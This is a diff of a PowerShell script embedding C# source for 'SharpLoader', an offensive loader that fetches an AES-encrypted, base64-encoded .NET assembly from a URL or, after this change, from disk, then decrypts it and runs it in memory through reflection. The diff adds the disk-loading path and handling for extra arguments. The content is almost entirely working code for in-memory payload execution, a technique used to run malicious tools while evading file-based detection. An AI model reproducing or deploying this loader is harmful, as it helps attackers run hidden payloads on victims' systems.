@@ -11,12 +11,18 @@ Param
     (
         [Parameter(Mandatory=$true)]
         [string]
-        $url,
+        $location,
         [Parameter(Mandatory=$true)]
 	    [string]
         $password,
         [string]
-        $argument
+        $argument,
+        [string]
+        $argument2,
+        [string]
+        $argument3,
+        [Switch]
+        $noArgs
 	)
 
 $sharploader = @"
@@ -31,7 +37,7 @@ using System.IO.Compression;
 
 namespace SharpLoader
 {
-    
+
     public class Program
     {
         public static void PrintBanner()
@@ -41,7 +47,7 @@ namespace SharpLoader
             Console.WriteLine(@"   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____     ");
             Console.WriteLine(@"  _\ \/ _ \/ _ `/ __/ _ \/ /__/ _ \/ _ `/ _  / -_) __/     ");
             Console.WriteLine(@" /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/        ");
-            Console.WriteLine(@"                  /_/                                      ");        
+            Console.WriteLine(@"                  /_/                                      ");
             Console.WriteLine(@"                                                           ");
             Console.WriteLine(@"             Loads an AES Encrypted CSharp File            ");
             Console.WriteLine(@"                        from disk or URL                   ");
@@ -77,6 +83,13 @@ namespace SharpLoader
                 Console.ResetColor();
                 return null;
             }
+        }
+
+        public static string Get_Stage2disk(string filepath)
+        {
+            string folderPathToBinary = filepath;
+            string base64 = System.IO.File.ReadAllText(folderPathToBinary);
+            return base64;
         }
 
         public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
@@ -195,7 +208,7 @@ namespace SharpLoader
                     object o = a.CreateInstance(method.Name);
                     method.Invoke(o, null);
                 }
-            }            
+            }
         }
 
         public static void Main(params string[] args)
@@ -205,9 +218,20 @@ namespace SharpLoader
             {
                 Console.WriteLine("Parameters missing");
             }
-            string URL = args[0];
-            Console.Write("[*] One moment while getting our file from URL.... ");
-            string Stage2 = Get_Stage2(URL);
+            string location = args[0];
+            string ishttp = "http";
+            string Stage2;
+            if (location.StartsWith(ishttp))
+            { 
+                Console.Write("[*] One moment while getting our file from URL.... ");
+                Stage2 = Get_Stage2(location);
+            }
+            else
+            {
+                Console.WriteLine("NO URL, loading from disk.");
+                Console.Write("[*] One moment while getting our file from disk.... ");
+                Stage2 = Get_Stage2disk(location);
+            }
             Console.WriteLine("-> Done");
             Console.WriteLine();
 
@@ -231,7 +255,7 @@ namespace SharpLoader
                 originalBytes[i - _saltSize] = bytesDecrypted[i];
             }
             object[] cmd = args.Skip(2).ToArray();
-            loadAssembly(originalBytes,cmd);
+            loadAssembly(originalBytes, cmd);
 
         }
     }
@@ -240,6 +264,21 @@ namespace SharpLoader
 
 Add-Type -TypeDefinition $sharploader
 
-[SharpLoader.Program]::Main("$url","$password","$argument")
+if ($noArgs)
+{
+    [SharpLoader.Program]::Main("$location","$password")
+}
+elseif ($argument3)
+{
+    [SharpLoader.Program]::Main("$location","$password","$argument","$argument2", "$argument3")
+}
+elseif ($argument2)
+{
+    [SharpLoader.Program]::Main("$location","$password","$argument","$argument2")
+}
+elseif ($argument)
+{
+    [SharpLoader.Program]::Main("$location","$password","$argument")
+}
 
 }
